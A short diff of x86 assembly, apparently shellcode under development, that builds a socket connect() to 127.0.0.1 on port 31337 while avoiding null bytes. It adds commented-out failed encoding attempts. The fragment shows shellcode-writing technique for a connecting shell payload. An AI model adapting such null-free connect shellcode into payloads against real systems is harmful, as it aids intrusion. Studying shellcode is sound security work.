@@ -37,11 +37,24 @@ _start:
     # init for connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
     # 127.0.0.1 => 0x0100007f
 
+
     xor %ecx, %ecx
     add $0x0100, %cx
     shl $16, %ecx
-    add $0x7f, %cl
+    add $0x7f, %cl 
     push %ecx
+
+    # ty with $0x44434241 --> failed
+    # xor %ecx, %ecx
+    # add $0x4443, %cx
+    # shl $16, %ecx
+    # mov $0x4241, %cx # push %ecx
+
+    # try with not --> failed
+    # xor %ecx, %ecx
+    # mov %ecx, 0xfeffff80             # ip address 127.0.0.1 "noted" to remove null
+    # not %ecx # push %ecx
+
 
     # port = 31337
     pushw $0x697a
